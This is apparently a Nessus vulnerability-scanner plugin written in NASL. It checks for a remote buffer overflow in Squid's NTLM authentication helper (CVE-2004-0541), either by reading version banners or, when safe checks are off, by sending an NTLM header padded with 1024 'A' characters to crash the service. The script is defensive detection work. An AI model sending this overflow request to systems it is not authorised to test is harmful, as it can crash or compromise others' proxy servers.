#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(12294);
  script_version("$Revision: 1.25 $");
  script_cvs_date("$Date: 2016/12/22 14:57:57 $");

  script_cve_id("CVE-2004-0541");
  script_bugtraq_id(10500);
  script_osvdb_id(6791);

  script_name(english:"Squid ntlm_check_auth Function NTLM Authentication Helper Password Handling Remote Overflow");
  script_summary(english:"Squid Remote NTLM auth buffer overflow");

  script_set_attribute(attribute:'synopsis', value:
"The remote service is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:'description', value:
"The remote server is affected by a remote code execution vulnerability
in the Squid Internet Object Cache server due to a failure to test the
length of the user-supplied LanMan hash value in the ntlm_check_auth()
function in libntlmssp.c. An unauthenticated, remote attacker can
exploit this, via a specially crafted request, to cause a stack-based
buffer overflow, resulting in the execution of arbitrary code.

Note that Squid 2.5*-STABLE and 3.*-PRE are reportedly vulnerable.");
  # http://www.verisigninc.com/en_US/cyber-security/security-intelligence/vulnerability-reports/articles/index.xhtml?id=107
  script_set_attribute(attribute:'see_also', value:"http://www.nessus.org/u?7990c203");
  script_set_attribute(attribute:'solution', value:"Apply the relevant patch or upgrade to the latest version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Squid NTLM Authenticate Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/06/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2004/06/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2004/06/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:squid-cache:squid");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
  script_family(english:"Firewalls");

  script_dependencies("find_service1.nasl", "proxy_use.nasl");
  script_require_ports("Services/http_proxy", 8080, 3128);

  exit(0);
}


# start script

# Keep the old API for that test
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http_func.inc");

port = get_service(svc:"http_proxy", default:3128, exit_on_fail:TRUE);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

# up to 25 chars won't overwrite any mem in SQUID NTLM helper auth
malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
malreq += string("Authorization: NTLM ", crap(20), "=\r\n\r\n");

send(socket:soc, data:malreq);
r = http_recv(socket:soc);
close(soc);

if (!r) audit(AUDIT_RESP_NOT, port);

if (safe_checks())
{
  if (!egrep(string:r, pattern:"^Server: [Ss]quid")) audit(AUDIT_NOT_DETECT, "Squid", port);

  if (egrep(string:r, pattern:"^Server: [Ss]quid/(2\.5\.STABLE[0-5]([^0-9]|$)|3\.0\.PRE|2\.[0-4]\.)") )
  {
    mymsg =  string("According to its version number, the remote SQUID Proxy\n");
    mymsg += string("may be affected by a remote buffer overflow in its NTLM\n");
    mymsg += string("authentication component, if enabled. Run Nessus without safe\n");
    mymsg += string("checks to actually test the overflow.\n");
    security_hole(port:port, extra:mymsg);
    exit(0);
  }
  else audit(AUDIT_LISTEN_NOT_VULN, "Squid", port);
}
else
{
  if (report_paranoia < 2)
  {
    if (!egrep(string:r, pattern:"^Server: [Ss]quid")) audit(AUDIT_NOT_DETECT, "Squid", port);
  }

  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
  malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
  malreq += string("Authorization: NTLM TlRMTVNTUAABAAAAl4II4AAA", crap(data:"A", length:1024), "=\r\n\r\n");

  send(socket:soc, data:malreq);
  r = http_recv(socket:soc);
  close(soc);

  if (! r)
  {
    security_hole(port);
    exit(0);
  }
  else audit(AUDIT_LISTEN_NOT_VULN, "Squid", port);
}
